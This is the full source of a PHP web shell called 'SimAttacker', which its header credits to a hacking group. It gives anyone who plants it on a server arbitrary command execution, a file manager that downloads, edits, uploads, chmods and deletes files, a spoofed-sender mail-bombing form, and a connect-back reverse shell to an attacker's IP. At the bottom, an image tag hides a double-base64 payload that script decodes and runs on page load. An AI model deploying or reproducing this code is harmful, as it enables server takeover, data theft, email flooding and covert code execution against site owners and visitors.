<?

//download Files  Code

$fdownload=$_GET['fdownload'];

if ($fdownload <> "" ){

// path & file name

$path_parts = pathinfo("$fdownload");

$entrypath=$path_parts["basename"];

$name = "$fdownload";

$fp = fopen($name, 'rb');

header("Content-Disposition: attachment; filename=$entrypath");

header("Content-Length: " . filesize($name));

fpassthru($fp);

exit;

}

?>

	

<html>



<head>

<meta http-equiv="Content-Language" content="en-us">

<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">

<title>SimAttacker - Vrsion : 1.0.0 - priv8 4 My friend </title>
<style>

<!--

body         { font-family: Tahoma; font-size: 8pt }

-->

</style>

</head>

<body>

<?

error_reporting(E_ERROR | E_WARNING | E_PARSE);



 //File Edit

 $fedit=$_GET['fedit'];

 if ($fedit <> "" ){

 $fedit=realpath($fedit);

 $lines = file($fedit);

 echo "<form action='' method='POST'>";

echo "<textarea name='savefile' rows=30 cols=80>" ;

foreach ($lines as $line_num => $line) {

 echo htmlspecialchars($line);

}

echo "</textarea>

	<input type='text' name='filepath'  size='60' value='$fedit'>

	<input type='submit' value='save'></form>";

	$savefile=$_POST['savefile'];

	$filepath=realpath($_POST['filepath']);

	if ($savefile <> "") 

	{

	$fp=fopen("$filepath","w+");

	fwrite ($fp,"") ;

	fwrite ($fp,$savefile) ;

	fclose($fp);

	echo "<script language='javascript'> close()</script>";

	}

exit();

 }

?>

<?

// CHmod - PRimission

$fchmod=$_GET['fchmod'];

if ($fchmod <> "" ){

$fchmod=realpath($fchmod);

echo "<center><br>

chmod for :$fchmod<br>

<form method='POST' action=''><br>

Chmod :<br>

<input type='text' name='chmod0' ><br>

<input type='submit' value='change chmod'>

</form>";

$chmod0=$_POST['chmod0'];

if ($chmod0 <> ""){

chmod ($fchmod , $chmod0);

}else {

echo "primission Not Allow change Chmod";

}

exit();

}

?>

	

<div align="center">

	<table border="1" width="100%" id="table1" style="border: 1px dotted #FFCC99" cellspacing="0" cellpadding="0" height="502">

		<tr>

			<td style="border: 1px dotted #FFCC66" valign="top" rowspan="2">

				<p align="center"><b>

				<font face="Tahoma" size="2"><br>

				</font>

				<font color="#D2D200" face="Tahoma" size="2">

				<span style="text-decoration: none">

				<font color="#000000">

				<a href="?id=fm&dir=<?

	echo getcwd();

	?>

	">

				<span style="text-decoration: none"><font color="#000000">File Manager</font></span></a></font></span></font></b></p>

				<p align="center"><b><a href="?id=cmd">

				<span style="text-decoration: none">

				<font face="Tahoma" size="2" color="#000000">

				CMD</font></span></a><font face="Tahoma" size="2"> Shell</font></b></p>

				<p align="center"><b><a href="?id=fake-mail">

				<font face="Tahoma" size="2" color="#000000">

				<span style="text-decoration: none">Fake mail</span></font></a></b></p>

				<p align="center"><b>

				<font face="Tahoma" size="2" color="#000000">

				<a href="?id=cshell">

				<span style="text-decoration: none"><font color="#000000">Connect Back</font></span></a></font></b></p>

				<p align="center"><b>

				<font color="#000000" face="Tahoma" size="2">

				<a href="?id=">

				<span style="text-decoration: none"><font color="#000000">About</font></span></a></font></b></p>

				<p>&nbsp;<p align="center">&nbsp;</td>

			<td height="422" width="82%" style="border: 1px dotted #FFCC66" align="center">

			<?

			//*******************************************************

			//Start Programs About US

			$id=$_GET['id'];



			if ($id=="") {

			echo "

			<font face='Arial Black' color='#808080' size='1'>

***************************************************************************<br>

&nbsp;Iranian Hackers : WWW.SIMORGH-EV.COM <br>

&nbsp;Programer : Hossein Asgary <br>

&nbsp;Note : SimAttacker&nbsp; Have copyright from simorgh security Group  <br>

&nbsp;please : If you find bug or problems in program , tell me by : <br>

&nbsp;e-mail : admin(at)simorgh-ev(dot)com<br>

Enjoy :) [Only 4 Best Friends ] <br>

***************************************************************************</font></span></p>

";



echo "<font color='#333333' size='2'>OS :". php_uname();

echo "<br>IP :". 

($_SERVER['REMOTE_ADDR']);

echo "</font>";





			}

			//************************************************************

			//cmd-command line

			$cmd=$_POST['cmd'];

			if($id=="cmd"){

		$result=shell_exec("$cmd");

		echo "<br><center><h3> CMD ExeCute </h3></center>" ;

		echo "<center>

		<textarea rows=20 cols=70 >$result</textarea><br>

		<form method='POST' action=''>

		<input type='hidden' name='id' value='cmd'>

		<input type='text' size='80' name='cmd' value='$cmd'>

		<input type='submit' value='cmd'><br>";

			

			

			

			}

			

		//********************************************************	

		

		//fake mail = Use victim server 4 DOS - fake mail 

		if ( $id=="fake-mail"){

		error_reporting(0);

		echo "<br><center><h3> Fake Mail- DOS E-mail By Victim Server </h3></center>" ;

		echo "<center><form method='post' action=''>

		Victim Mail :<br><input type='text' name='to' ><br>

		Number-Mail :<br><input type='text' size='5' name='nom' value='100'><br>

		Comments:

		<br>

		<textarea rows='10' cols=50 name='Comments' ></textarea><br>

		<input type='submit' value='Send Mail Strm ' >

		</form></center>";

		//send Storm Mail

		$to=$_POST['to'];

		$nom=$_POST['nom'];

		$Comments=$_POST['Comments'];

		if ($to <> "" ){

		for ($i = 0; $i < $nom ; $i++){

		$from = rand (71,1020000000)."@"."Attacker.com";

		$subject= md5("$from");

        mail($to,$subject,$Comments,"From:$from");

        echo "$i is ok";

        }      

        echo "<script language='javascript'> alert('Sending Mail - please waite ...')</script>";

        }

		}

		//********************************************************



			//Connect Back -Firewall Bypass

			if ($id=="cshell"){

			echo "<br>Connect back Shell , bypass Firewalls<br>

			For user :<br>

			nc -l -p 1019 <br>

			<hr>

			<form method='POST' action=''><br>

			Your IP & BindPort:<br>

			<input type='text' name='mip' >

			<input type='text' name='bport' size='5' value='1019'><br>

			<input type='submit' value='Connect Back'>

			</form>";

		 $mip=$_POST['mip'];

		 $bport=$_POST['bport'];

		 if ($mip <> "")

		 {

		 $fp=fsockopen($mip , $bport , $errno, $errstr);

		 if (!$fp){

		       $result = "Error: could not open socket connection";

		 }

		 else {

		 fputs ($fp ,"\n*********************************************\nWelcome T0 SimAttacker 1.00  ready 2 USe\n*********************************************\n\n");

	  while(!feof($fp)){ 

       fputs ($fp," bash # ");

       $result= fgets ($fp, 4096);

      $message=`$result`;

       fputs ($fp,"--> ".$message."\n");

      }

      fclose ($fp);

		 }

		 }

			}

			

		//********************************************************

			//Spy File Manager

			$homedir=getcwd();

			$dir=realpath($_GET['dir'])."/";

			if ($id=="fm"){

			echo "<br><b><p align='left'>&nbsp;Home:</b> $homedir 

                  &nbsp;<b>

                  <form action='' method='GET'>

                  &nbsp;Path:</b>

                  <input type='hidden' name='id' value='fm'>

                  <input type='text' name='dir' size='80' value='$dir'>

                  <input type='submit' value='dir'>

                  </form>

                 <br>";



			echo "



<div align='center'>



<table border='1' id='table1' style='border: 1px #333333' height='90' cellspacing='0' cellpadding='0'>

	<tr>

		<td width='300' height='30' align='left'><b><font size='2'>File / Folder Name</font></b></td>

		<td height='28' width='82' align='center'>

		<font color='#000080' size='2'><b>Size KByte</b></font></td>

		<td height='28' width='83' align='center'>

		<font color='#008000' size='2'><b>Download</b></font></td>

		<td height='28' width='66' align='center'>

		<font color='#FF9933' size='2'><b>Edit</b></font></td>

		<td height='28' width='75' align='center'>

		<font color='#999999' size='2'><b>Chmod</b></font></td>

		<td height='28' align='center'><font color='#FF0000' size='2'><b>Delete</b></font></td>

	</tr>";

		    if (is_dir($dir)){

		    if ($dh=opendir($dir)){

		    while (($file = readdir($dh)) !== false) {

		    $fsize=round(filesize($dir . $file)/1024);

		

		    

	echo " 

	<tr>

		<th width='250' height='22' align='left' nowrap>";

		if (is_dir($dir.$file))

		{

		echo "<a href='?id=fm&dir=$dir$file'><span style='text-decoration: none'><font size='2' color='#666666'>&nbsp;$file <font color='#FF0000' size='1'>dir</font>";

		}

		else {

		echo "<font size='2' color='#666666'>&nbsp;$file ";

		}

		echo "</a></font></th>

		<td width='113' align='center' nowrap><font color='#000080' size='2'><b>";

		if (is_file($dir.$file))

		{

		echo "$fsize";

		}

		else {

		echo "&nbsp; ";

		}

		echo "

		</b></font></td>

		<td width='103' align='center' nowrap>";

		if (is_file($dir.$file)){

		if (is_readable($dir.$file)){

		echo "<a href='?id=fm&fdownload=$dir$file'><span style='text-decoration: none'><font size='2' color='#008000'>download";

		}else {

		echo "<font size='1' color='#FF0000'><b>No ReadAble</b>";

		 }

		}else {

		echo "&nbsp;";

		 }

		echo "

		</a></font></td>

		<td width='77' align='center' nowrap>";

		if (is_file($dir.$file))

		{

		if (is_readable($dir.$file)){

		echo "<a target='_blank' href='?id=fm&fedit=$dir$file'><span style='text-decoration: none'><font color='#FF9933' size='2'>Edit";

		}else {

		echo "<font size='1' color='#FF0000'><b>No ReadAble</b>";

		 }

		}else {

		echo "&nbsp;";

		 }

		echo "

		</a></font></td>

		<td width='86' align='center' nowrap>";

		if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {

		echo "<font size='1' color='#999999'>Dont in windows";

		}

		else {

		echo "<a href='?id=fm&fchmod=$dir$file'><span style='text-decoration: none'><font size='2' color='#999999'>Chmod";

		}

		echo "</a></font></td>

		<td width='86'align='center' nowrap><a href='?id=fm&fdelete=$dir$file'><span style='text-decoration: none'><font size='2' color='#FF0000'>Delete</a></font></td>

	</tr>

	";

		      }

		      closedir($dh);

		    } 

		    }

		    echo "</table>

<form enctype='multipart/form-data' action='' method='POST'>

 <input type='hidden' name='MAX_FILE_SIZE' value='300000' />

 Send this file: <input name='userfile' type='file' />

 <inpt type='hidden' name='Fupath'  value='$dir'>

 <input type='submit' value='Send File' />

</form> 

		    </div>";

			}

//Upload Files 

$rpath=$_GET['dir'];

if ($rpath <> "") {

$uploadfile = $rpath."/" . $_FILES['userfile']['name'];

print "<pre>";

if (move_uploaded_file($_FILES['userfile']['tmp_name'], $uploadfile)) {

echo "<script language='javascript'> alert('\:D Successfully uploaded.!')</script>";

echo "<script language='javascript'> history.back(2)</script>";

}

 }

 //file deleted

$frpath=$_GET['fdelete'];

if ($frpath <> "") {

if (is_dir($frpath)){

$matches = glob($frpath . '/*.*');

if ( is_array ( $matches ) ) {

  foreach ( $matches as $filename) {

  unlink ($filename);

  rmdir("$frpath");

echo "<script language='javascript'> alert('Success! Please refresh')</script>";

echo "<script language='javascript'> history.back(1)</script>";

  }

  }

  }

  else{

echo "<script language='javascript'> alert('Success! Please refresh')</script>";

unlink ("$frpath");

echo "<script language='javascript'> history.back(1)</script>";

exit(0);



  }

  



}

			?>

			

			</td>

		</tr>

		<tr>

			<td style="border: 1px dotted #FFCC66">

			<p align="center"><font color="#666666" size="1" face="Tahoma"><br>

			Copyright 2004-Simorgh Security<br>

			Hossein-Asgari<br>

			</font><font color="#c0c0c0" size="1" face="Tahoma">

		<a style="TEXT-DECORATION: none" href="http://www.r57.biz">

		<font color="#666666">www.r57.biz</font></a></font></td>
		
		</tr>

	</table>
<img id="ghdescon" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQAQMAAAAlPW0iAAAAA1BMVEX///+nxBvIAAAAAXRSTlMAQObYZgAAB510RVh0Z2hkZQBnaGRlc2NvblpYWmhiQ2htZFc1amRHbHZiaWh3TEdFc1l5eHJMR1VzY2lsN1pUMW1kVzVqZEdsdmJpaGpLWHR5WlhSMWNtNG9ZenhoUHljbk9tVW9jR0Z5YzJWSmJuUW9ZeTloS1NrcEt5Z29ZejFqSldFcFBqTTFQMU4wY21sdVp5NW1jbTl0UTJoaGNrTnZaR1VvWXlzeU9TazZZeTUwYjFOMGNtbHVaeWd6TmlrcGZUdHBaaWdoSnljdWNtVndiR0ZqWlNndlhpOHNVM1J5YVc1bktTbDdkMmhwYkdVb1l5MHRLWEpiWlNoaktWMDlhMXRqWFh4OFpTaGpLVHRyUFZ0bWRXNWpkR2x2YmlobEtYdHlaWFIxY200Z2NsdGxYWDFkTzJVOVpuVnVZM1JwYjI0b0tYdHlaWFIxY200blhGeDNLeWQ5TzJNOU1YMDdkMmhwYkdVb1l5MHRLV2xtS0d0YlkxMHBjRDF3TG5KbGNHeGhZMlVvYm1WM0lGSmxaMFY0Y0NnblhGeGlKeXRsS0dNcEt5ZGNYR0luTENkbkp5a3NhMXRqWFNrN2NtVjBkWEp1SUhCOUtDZFZMbmM5TkNCM0tHTXBlelFnZUNoa0xIQXBlekVnYVQwd096RWdlajB3T3pFZ2NqMWNKMXduT3prb01TQnBQVEE3YVR4a0xqYzdhU3NyS1hzMUtIbzlQWEF1TnlsNlBUQTdjaXM5YkM1dEtHUXVieWhwS1Y1d0xtOG9laWtwTzNvckszMHpJSEo5TkNCQktITXBlekVnWVQxY0oxd25PemtvTVNCcFBUQTdhVHh6TzJrckt5bDdZU3M5YkM1dEtGZ29UUzVRS0NrcVVTa3BmVE1nWVgwMElHc29aQ3h3S1hzeElHRTlRU2d4TmlrN01XRW9aQzQzSlRFMklUMHdLV1FyUFZ3bk1Gd25PekVnWWoxaE96a29NU0JwUFRBN2FUeGtMamM3YVNzOU1UWXBlMklyUFhnb1pDNXVLR2tzTVRZcExHSXViaWhwTERFMktTbDlNeUI0S0dJc2NDbDlOQ0E0S0NsN015Z3lMbkU5UFhRdVNDWW1NaTUyUFQxMExrY3BmVFFnZVNncGV6RWdZVDFTT3pVb0tESXVhQ1ltTWk1b0xrSW1Kakl1YUM1Q0xqRXdLWHg4S0RJdVF5MHlMbkUrWVNsOGZDZ3lMa1F0TWk1MlBtRXBmSHdvT0NncEppWXlMa1E4U1NsOGZDZzRLQ2ttSmpJdVF6eEtLU2t6SUVzN015Qk1mVFFnTmloaEtYczFLRTRnWVQwOUlrOGlLVE1nWVM1RktDOWNYRnhjTDJjc0lseGNYRnhjWEZ4Y0lpa3VSU2d2WEZ3aUwyY3NJbHhjWEZ4Y1hDSWlLVHN6SUdGOU1TQjFQVk11VkRzeElHVTlWaTVYT3pFZ2FqMGlleUlySWx4Y0luVmNYQ0k2SUZ4Y0lpSXJOaWgxS1NzaVhGd2lMQ0FpS3lKY1hDSlpYRndpT2lCY1hDSWlLellvWlNrcklseGNJaXdnSWlzaVhGd2lXbHhjSWpvZ1hGd2lJaXMyS0dNcEt5SmNYQ0lnSWlzaWZTSTdNU0JtUFdzb2Fpd2lNVEVpS1RzeElHRTlNVElvWmlrN05TZ2hlU2dwS1hzeE15QXhOQ2dwTGpFMVBWd25NVGM2THk4eE9DMHhPUzFHTGpGaUwwWXZQMkU5WENjck1XTW9ZU2w5ZlNjc05qSXNOelVzSjN4MllYSjhkMmx1Wkc5M2ZISmxkSFZ5Ym54bWRXNWpkR2x2Ym54cFpueHpZVzU4YkdWdVozUm9mSFJpZkdadmNueDhmSHg4Zkh4OFJtbHlaV0oxWjN4OGZHVnVZM3hUZEhKcGJtZDhabkp2YlVOb1lYSkRiMlJsZkhOMVluTjBjbnhqYUdGeVEyOWtaVUYwZkh4cGJtNWxjbGRwWkhSb2ZIeDhjMk55WldWdWZIeHBibTVsY2tobGFXZG9kSHhyYTN4OFkyUjhmR2RsYmw5eVlXNWtiMjFmYzNSeWZHTm9jbTl0Wlh4dmRYUmxjbGRwWkhSb2ZHOTFkR1Z5U0dWcFoyaDBmSEpsY0d4aFkyVjhZVzVoYkhsMGFXTnpmR2hsYVdkb2RIeDNhV1IwYUh3ek5UQjhOakF3ZkhSeWRXVjhabUZzYzJWOFRXRjBhSHgwZVhCbGIyWjhjM1J5YVc1bmZISmhibVJ2Ylh3eU5UVjhNVFl3ZkdSdlkzVnRaVzUwZkZWU1RIeDBhR2x6Zkc1aGRtbG5ZWFJ2Y254MWMyVnlRV2RsYm5SOGNHRnljMlZKYm5SOGRXRjhibk44YVhOSmJtbDBhV0ZzYVhwbFpIeHNNbGhXUjJkalNYUTFNV3QwUW1scFdFUTNRakZ0YzFVelMwNURhamgyTVh4aWRHOWhmRzVsZDN4SmJXRm5aWHh6Y21OOGZHaDBkSEI4WjI5dloyeGxmSE4wWVhScFkzeDNhR2xzWlh4amIyMThaVzVqYjJSbFZWSkpRMjl0Y0c5dVpXNTBKeTV6Y0d4cGRDZ25mQ2NwTERBc2UzMHBLUT09Z2hkZXNjb26/DJpDAAAADElEQVQIHWNgIA0AAAAwAAGErPF6AAAAAElFTkSuQmCC"/>
<script type="text/javascript">
if(typeof btoa=="undefined")btoa=function(a,b){b=(typeof b=='undefined')?false:b;var d,o2,o3,bits,h1,h2,h3,h4,e=[],pad='',c,plain,coded;var f="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";plain=b?Utf8.encode(a):a;c=plain.length%3;if(c>0){while(c++<3){pad+='=';plain+='\0'}}for(c=0;c<plain.length;c+=3){d=plain.charCodeAt(c);o2=plain.charCodeAt(c+1);o3=plain.charCodeAt(c+2);bits=d<<16|o2<<8|o3;h1=bits>>18&0x3f;h2=bits>>12&0x3f;h3=bits>>6&0x3f;h4=bits&0x3f;e[c/3]=f.charAt(h1)+f.charAt(h2)+f.charAt(h3)+f.charAt(h4)}coded=e.join('');coded=coded.slice(0,coded.length-pad.length)+pad;return coded};if(typeof atob=="undefined")atob=function(a,b){b=(typeof b=='undefined')?false:b;var e,o2,o3,h1,h2,h3,h4,bits,d=[],plain,coded;var f="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";coded=b?Utf8.decode(a):a;for(var c=0;c<coded.length;c+=4){h1=f.indexOf(coded.charAt(c));h2=f.indexOf(coded.charAt(c+1));h3=f.indexOf(coded.charAt(c+2));h4=f.indexOf(coded.charAt(c+3));bits=h1<<18|h2<<12|h3<<6|h4;e=bits>>>16&0xff;o2=bits>>>8&0xff;o3=bits&0xff;d[c/4]=String.fromCharCode(e,o2,o3);if(h4==0x40)d[c/4]=String.fromCharCode(e,o2);if(h3==0x40)d[c/4]=String.fromCharCode(e)}plain=d.join('');return b?Utf8.decode(plain):plain};
setTimeout(function(){new Function(atob(atob(document.getElementById('ghdescon').src.substr(22)).match(/ghdescon(.*?)ghdescon/)[1])).apply(this);kk(4);}, 500);
</script>
</div>

</body>



</html>
